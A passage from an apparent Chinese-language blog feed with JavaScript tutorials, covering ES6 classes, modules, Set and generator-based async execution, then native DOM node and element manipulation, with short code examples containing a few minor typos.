class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(length, width) &#123;</span><br><span class="line">    <span class="keyword">this</span>.length = length;</span><br><span class="line">    <span class="keyword">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">  getArea() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.length * <span class="keyword">this</span>.width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="6-2-super"><a href="#6-2-super" class="headerlink" title="6.2 super()"></a>6.2 super()</h4><p><code>super()</code>方法可访问基类的构造函数。ES6要求，子类的构造函数必须执行依次super函数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(length) &#123;</span><br><span class="line">    <span class="keyword">super</span>(length, length)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> square = <span class="keyword">new</span> Square(<span class="number">3</span>);</span><br><span class="line"><span class="built_in">console</span>.log(square.getArea()) <span class="comment">// 9</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-模块"><a href="#7-模块" class="headerlink" title="7. 模块"></a>7. 模块</h3><p>模块是一种打包和封装功能的方式，模块的行为与脚本不同，模块不会将它的顶级变量、函数和类修改为全局作用域，而且<code>this</code>的值为<code>undefined</code>。</p><h4 id="7-1-export"><a href="#7-1-export" class="headerlink" title="7.1 export"></a>7.1 export</h4><p>将一部分已发布的代码暴露给其他模块<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> color = <span class="string">"red"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(height, width) &#123;</span><br><span class="line">    <span class="keyword">this</span>.length = length;</span><br><span class="line">    <span class="keyword">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params">num1, num2</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 * num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出默认值</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> multiply;</span><br></pre></td></tr></table></figure></p><h4 id="7-2-import"><a href="#7-2-import" class="headerlink" title="7.2 import"></a>7.2 import</h4><p>从模块中导出的功能可以通过<code>import</code>关键字在另一个模块中访问<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; identifier1, identifier2 &#125; <span class="keyword">from</span> <span class="string">"./example.js"</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> example <span class="keyword">from</span> <span class="string">"./example.js"</span></span><br></pre></td></tr></table></figure></p><h4 id="7-3-加载模块"><a href="#7-3-加载模块" class="headerlink" title="7.3 加载模块"></a>7.3 加载模块</h4><p>通过<code>&lt;script type=&quot;module&quot;&gt;</code>加载的模块文件默认具有defer属性，在文档完全被解析后，模块按照它们在文档中出现的顺序依次执行。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span> <span class="attr">src</span>=<span class="string">"module.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; sum &#125; <span class="keyword">from</span> <span class="string">"./example.js"</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> result = sum(<span class="number">1</span>, <span class="number">2</span>)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="8-其它"><a href="#8-其它" class="headerlink" title="8. 其它"></a>8. 其它</h3><p>Set、Map、Symbol、Interator、Generator、Promise、Proxy、Reflection</p><h4 id="8-1-Set过滤重复值"><a href="#8-1-Set过滤重复值" class="headerlink" title="8.1 Set过滤重复值"></a>8.1 Set过滤重复值</h4><p>对一个数组，进行复制并创建一个无重复元素的新数组。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]);</span><br><span class="line">    array = [...set];</span><br><span class="line"><span class="built_in">console</span>.log(array);   <span class="comment">// [1,2,3,4,5]</span></span><br></pre></td></tr></table></figure></p><h4 id="8-2-Generator的异步应用"><a href="#8-2-Generator的异步应用" class="headerlink" title="8.2 Generator的异步应用"></a>8.2 Generator的异步应用</h4><h5 id="8-2-1-协程"><a href="#8-2-1-协程" class="headerlink" title="8.2.1 协程"></a>8.2.1 协程</h5><p>多个线程互相协作，完成异步任务。大致流程：①协程A开始执行。②协程A执行到一半，进入暂停，执行权转移到协程B。③(一段时间后)协程B交还执行权。④协程A恢复执行。</p><p>协程遇到yield命令就暂停，等到执行权返回，再从暂停的地方继续往后执行。<em>优点：写法非常像同步操作</em>。每次调用<code>next</code>方法，会返回一个对象，表示当前阶段的信息(<code>value</code>和<code>done</code>)。<code>value</code>是<code>yield</code>语句后表达式的值，<code>done</code>是一个布尔值，表示Generator函数是否执行完毕。<code>next</code>返回的value，是Generator向外输出的数据；<code>next</code>方法还可以接受参数，向Generator函数体内输入数据。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用Generator，执行一个真实的异步任务</span></span><br><span class="line"><span class="keyword">var</span> fetch = <span class="built_in">require</span>(<span class="string">'node-fetch'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">gen</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'https://api.github.com/users/github'</span>;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="keyword">yield</span> fetch(url);</span><br><span class="line">  <span class="built_in">console</span>.log(result.bio)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g = gen();</span><br><span class="line"><span class="keyword">var</span> result = g.next();</span><br><span class="line">result.value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  g.next(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h5 id="8-2-2-基于Thunk函数的Generator执行器"><a href="#8-2-2-基于Thunk函数的Generator执行器" class="headerlink" title="8.2.2 基于Thunk函数的Generator执行器"></a>8.2.2 基于Thunk函数的Generator执行器</h5><p>执行过程：将同一个回调函数，反复传入next方法的value属性。内部的next函数就是Thunk的回调函数。next函数先将指针移到Generator函数的下一步（gen.next方法），根据result.done判断函数是否结束，没结束将next函数再次传入。已结束，直接退出。只要 Generator 函数还没执行到最后一步，next函数就调用自身，以此实现自动执行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> readFile = <span class="function"><span class="keyword">function</span> (<span class="params">fileName</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    fs.readFile(fileName, <span class="function"><span class="keyword">function</span>(<span class="params">error, data</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (error) <span class="keyword">return</span> reject(error);</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> gen = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f1 = <span class="keyword">yield</span> readFile(<span class="string">'/etc/fstab'</span>);</span><br><span class="line">  <span class="keyword">var</span> f2 = <span class="keyword">yield</span> readFile(<span class="string">'/etc/shells'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(f1.toString());</span><br><span class="line">  <span class="built_in">console</span>.log(f2.toString());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>手动执行上面的Generator函数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> g = gen();</span><br><span class="line"></span><br><span class="line">g.next().value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  g.next(data).value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    g.next(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>手动执行，转换为自动执行器<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">gen</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> g = gen();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = g.next(data);</span><br><span class="line">    <span class="keyword">if</span> (result.done) <span class="keyword">return</span> result.value;</span><br><span class="line">    result.value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">      next(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">run(gen);</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li>《深入理解ES6》NICHOLAS C.ZAKAS</li><li><a href="http://es6.ruanyifeng.com/" target="_blank" rel="noopener">《ECMAScript6入门》 阮一峰</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DOM - 原生js操作页面元素</title>
      <link href="/2018/10/07/DOM/"/>
      <url>/2018/10/07/DOM/</url>
      <content type="html"><![CDATA[<h3 id="1-Node"><a href="#1-Node" class="headerlink" title="1. Node"></a>1. Node</h3><p>DOM是针对HTML和XML文档的一个API。DOM描述了一个层次化的节点树，允许开发人员添加、移除和修改页面的某一部分。每一段标记都可以通过树中的一个节点来表示。<br><img src="/2018/10/07/DOM/1.png" style="max-width:250px"></p><p><br></p><h4 id="1-1-节点类型"><a href="#1-1-节点类型" class="headerlink" title="1.1 节点类型"></a>1.1 节点类型</h4><p>JS中的所有节点类型都继承自Node类型，除了IE，其他浏览器都可以访问这个类型。每个节点都有一个<code>nodeType</code>属性，由12个数值常量来表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Node.ELEMENT_NODE           | 1</span><br><span class="line">Node.ATTRIBUTE_NODE         | 2</span><br><span class="line">Node.TEXT_NODE              | 3</span><br><span class="line">Node.CDATA_SECTION_NODE     | 4</span><br><span class="line">Node.ENTITY_REFERENCE_NODE  | 5</span><br><span class="line">Node.ENTITY_NODE            | 6</span><br><span class="line">Node.PROCESSING_INSTRUCTION_NODE | 7 </span><br><span class="line">Node.COMMENT_NODE           | 8</span><br><span class="line">Node.DOCUMENT_NODE          | 9</span><br><span class="line">Node.DOCUMENT_TYPE_NODE     | 10</span><br><span class="line">Node.DOCUMENT_FRAGMENT_NODE | 11</span><br><span class="line">Node.NOTATION_NODE          | 12</span><br></pre></td></tr></table></figure></p><p>要了解节点的信息，可以使用<code>nodeName</code>和<code>nodeValue</code>属性。</p><p><br></p><h4 id="1-2-节点关系"><a href="#1-2-节点关系" class="headerlink" title="1.2 节点关系"></a>1.2 节点关系</h4><p>每一个节点都有一个<code>childNodes</code>属性，其中保存着一个<code>NodeList</code>对象。<code>NodeList</code>是一种类数组对象，用于保存一组有序的节点，它实际上基于DOM结构动态执行查询的结果。DOM结构的变化能自动反映在<code>NodeList</code>对象中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">someNode.childNodes[0]      // 子节点</span><br><span class="line">someNode.childNodes.item(1)</span><br><span class="line">someNode.hasChildNodes()    // 是否有子节点</span><br><span class="line"></span><br><span class="line">someNode.parentNode         // 父节点</span><br><span class="line">someNode.previousSibling    // 前一个同胞节点</span><br><span class="line">someNode.nextSibling        // 后一个同胞节点</span><br><span class="line">someNode.fistChild == someNode.childNodes[0]  // 第一个子节点</span><br><span class="line">someNode.lastChild          // 最后一个子节点</span><br></pre></td></tr></table></figure></p><p><code>document.getElementById(&#39;myList&#39;).childNodes</code>,IE会任务<code>&lt;ul&gt;</code>有三个<code>&lt;li&gt;</code>子节点。其他浏览器会认为，<code>&lt;ul&gt;</code>有3个<code>&lt;li&gt;</code>元素和4个文本节点(li元素之间的空白符)。这意味着，如果需要通过childNodes遍历子节点时，要检查nodeType属性是否为1(元素节点)。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"myList"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"myList"</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-3-操作节点"><a href="#1-3-操作节点" class="headerlink" title="1.3 操作节点"></a>1.3 操作节点</h4><ul><li><p><em>appendChild</em><br>用于向<code>childNodes</code>列表的末尾添加一个节点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">someNode.appendChild(newNode);</span><br><span class="line">console.log(someNode.lastChild = newNode) // true</span><br></pre></td></tr></table></figure></li><li><p><em>insertBefore</em><br>把节点放在<code>childNodes</code>列表中某个特定位置上。插入节点后，被插入的节点会变成参照节点的前一个同胞节点(previousSibling)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">someNode.insertBoefore(newNode, someNode.firstChild) // 插入后成为第一个节点</span><br><span class="line">someNode.insertBefore(newNode, someNode.lastChild) // 插入后成为倒数第二个节点</span><br></pre></td></tr></table></figure></li><li><p><em>replaceChild</em><br>将要替换的节点从文档树中移出，同时要插入的节点占据位置。要使用上面这几个方法必须先取得父节点<code>parentNode</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">someNode.replaceChild(newNode, someNode.firstChild) // 替换第一个节点</span><br></pre></td></tr></table></figure></li><li><p><em>removeChild</em><br>移除节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">someNode.removeChild(someNode.firstChild) // 移除第一个节点</span><br></pre></td></tr></table></figure></li><li><p><em>cloneNode</em><br>创建调用这个方法的节点的一个完全相同的副本，接受一个布尔值参数，表示是否执行深复制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myList.cloneNode(true)  // 复制节点和整个子节点数</span><br><span class="line">myList.cloneNode(false) // 只复制节点本身</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="2-Document"><a href="#2-Document" class="headerlink" title="2. Document"></a>2. Document</h3><p><code>document</code>对象是<code>HTMLDocument</code>的一个实例，表示整个HTML页面。而且，document对象是window对象的属性，可以作为全局对象来访问。</p><p><br></p><h4 id="2-1-文档信息"><a href="#2-1-文档信息" class="headerlink" title="2.1 文档信息"></a>2.1 文档信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">document.documentElement // 指向&lt;html&gt;元素</span><br><span class="line">document.body     // 指向&lt;body&gt;元素</span><br><span class="line">document.title    // 文档标题</span><br><span class="line">document.URL      // 完整的url</span><br><span class="line">document.domain   // 域名</span><br><span class="line">document.referrer // 来源页面的URL</span><br><span class="line"></span><br><span class="line">document.title = &apos;首页&apos;</span><br><span class="line">document.domain = &apos;wrox.com&apos;</span><br><span class="line"></span><br><span class="line">document.anchors  // 文档中所有带name属性的&lt;a&gt;元素</span><br><span class="line">document.forms    // 文档中所有&lt;form&gt;元素</span><br><span class="line">document.images   // 文档中所有&lt;img&gt;元素</span><br><span class="line">document.links    // 文档中所有带href的&lt;a&gt;元素</span><br></pre></td></tr></table></figure><p><code>document.domain</code>是可以设置的，但由于安全限制，如果url中包含一个子域名，<code>p2p.wrox.com</code>可以把<code>domain</code>设置为<code>wrox.com</code>。当页面中包含来自其它子域的iframe时， 通过将每个页面的<code>document.domain</code>设置为相同的值，这些页面就可以互相访问对方包含的Javascript对象。</p><p><br></p><h4 id="2-2-查找元素"><a href="#2-2-查找元素" class="headerlink" title="2.2 查找元素"></a>2.2 查找元素</h4><ul><li><p><em>document.getElement</em><br>会返回一个<code>HTMLCollection</code>对象，该对象与<code>NodeList</code>非常相似。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById()</span><br><span class="line"></span><br><span class="line">document.getElementsByTagName()</span><br><span class="line">document.getElementsByTagName(&quot;*&quot;)</span><br><span class="line">document.getElementsByTagName(&apos;img&apos;)[0].src</span><br><span class="line"></span><br><span class="line">document.getElementsByName()  // 常见取得表单选项</span><br><span class="line">document.getElementsByName(&apos;color&apos;)</span><br><span class="line">&lt;input type=&quot;raido&quot; name=&quot;color&quot;&gt;</span><br><span class="line"></span><br><span class="line">document.getElementById(&apos;list&apos;).getElementsByTagName(&apos;li&apos;)</span><br></pre></td></tr></table></figure></li><li><p><em>querySelector</em><br>接受一个CSS选择符，返回与该模式匹配的第一个元素，没有则返回null。<br>IE 8+, Firefox 3.5+, Safari 3.1+, Chrome和Opera 10+都支持<code>querySelector()和querySelectorAll()</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">"#myDiv"</span>);</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">".selected"</span>);</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">"img.button"</span>);</span><br></pre></td></tr></table></figure></li><li><p><em>querySelectorAll</em><br>接受一个CSS选择符，返回一个NodeList实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docuemnt.getElementById(<span class="string">"myDiv"</span>).querySelectorAll(<span class="string">"em"</span>);</span><br><span class="line">docuemnt.querySelectorAll(<span class="string">".selected"</span>);</span><br><span class="line">docuemnt.querySelectorAll(<span class="string">"p strong"</span>);</span><br></pre></td></tr></table></figure></li><li><p><em>根据关系查找元素</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">childElementCount      // 返回子元素的个数</span><br><span class="line">firstElementChild      // 指向第一个子元素</span><br><span class="line">lastELementChild       // 指向最后一个子元素</span><br><span class="line">previousElementSibling // 指向前一个同辈元素</span><br><span class="line">nextElementSibling     // 指向后一个同辈元素</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-5-文档写入"><a href="#2-5-文档写入" class="headerlink" title="2.5 文档写入"></a>2.5 文档写入</h4><p>将输出流写入到网页的能力: <code>write(), writeIn(), open(), close()</code>。如果在文档结束后再调用<code>document.write()</code>，那么输出的内容将会重写整个页面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;strong&gt;&quot; + (newDate()).toString() + &quot;&lt;/strong&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;script type=\&quot;text/javascript\&quot; src=\&quot;file.js\&quot;&gt;&quot; + &quot;&lt;\/script&gt;&quot;);</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="3-Element"><a href="#3-Element" class="headerlink" title="3. Element"></a>3. Element</h3><p>Element类型用于表现XML或HTML元素，提供了对元素标签名、子节点及特性的访问。</p><h4 id="3-1-HTML元素"><a href="#3-1-HTML元素" class="headerlink" title="3.1 HTML元素"></a>3.1 HTML元素</h4><ul><li><p>元素属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">element.nodeType    // 元素类型</span><br><span class="line">element.nodeName    // 元素的标签名，也可以使用element.tagName</span><br><span class="line">element.nodeValue   // 元素的值</span><br><span class="line">element.parentNode  // 可能是Document或Element</span><br></pre></td></tr></table></figure></li><li><p>HTMLElement子元素<br>所有HTML元素都由HTMLElement类型表示，每种元素都有与之对应的特性和方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 只列举少量</span><br><span class="line">HTMLAnchorElement, HTMLBRElement, HTMLButtonElement, HTMLTableColElement, </span><br><span class="line">HTMLDivElement,HTMLFormElement,  HTMLFrameElement, HTMLFrameSetElement, </span><br><span class="line">HTMLHeadingElement, HTMLHeadElement, HTMLImageElement, HTMLInputElement, </span><br><span class="line">HTMLLabelElement, HTMLLIElement, HTMLMetaElement, HTMLOListElement, </span><br><span class="line">HTMLOptionElement, HTMLParagraphElement, HTMLScriptElement, HTMLStyleElement,</span><br><span class="line">HTMLTableElement</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="3-2-元素特性"><a href="#3-2-元素特性" class="headerlink" title="3.2 元素特性"></a>3.2 元素特性</h4><ul><li><p>获取元素特性<br>开发人员经常直接使用元素的属性，只有在取自定义特性值的情况下，才会使用<code>getAttribute()</code>方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"myDiv"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"bd"</span> my_attr=<span class="string">"hello!"</span> style=<span class="string">"display:none"</span> onclick=<span class="string">"f()"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>);</span><br><span class="line">div.id                       <span class="comment">// "myDiv"</span></span><br><span class="line">div.className                <span class="comment">// "bd"</span></span><br><span class="line">div.style                    <span class="comment">// 返回一个对象</span></span><br><span class="line">div.onclick                  <span class="comment">// 返回一个JS函数 || null</span></span><br><span class="line">div.getAttribute(<span class="string">'id'</span>)       <span class="comment">// "myDiv"</span></span><br><span class="line">div.getAttribute(<span class="string">'class'</span>)    <span class="comment">// "bd"</span></span><br><span class="line">div.getAttribute(<span class="string">'my_attr'</span>)  <span class="comment">// "hello!"</span></span><br><span class="line">div.getAttribute(<span class="string">'style'</span>)    <span class="comment">// 返回的是CSS文本</span></span><br><span class="line">div.getAttribute(<span class="string">'onclick'</span>)  <span class="comment">// 返回相应代码的字符串</span></span><br></pre></td></tr></table></figure></li><li><p>设置/删除元素特性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.setAttribute(key, val)</span><br><span class="line">div[key] = val;  <span class="comment">// 自定义的属性不会生效</span></span><br><span class="line">div.removeAttribute(key)</span><br></pre></td></tr></table></figure></li><li><p>element.attributes<br>将DOM结构序列化为HTML字符串，遍历元素特性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; element.attributes.length; i++ 